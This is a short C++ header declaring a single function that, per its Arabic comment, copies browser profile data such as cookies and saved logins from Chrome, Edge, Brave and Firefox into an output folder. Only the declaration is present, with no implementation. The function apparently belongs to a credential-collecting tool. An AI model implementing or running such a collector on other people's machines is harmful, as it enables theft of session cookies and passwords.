// browser_collector.h
#pragma once
#include <string>

// ينسخ ملفات تعريف المتصفحات (cookies, logins, etc) من Chrome, Edge, Brave, Firefox
void CollectBrowsersData(const std::string& outputDir);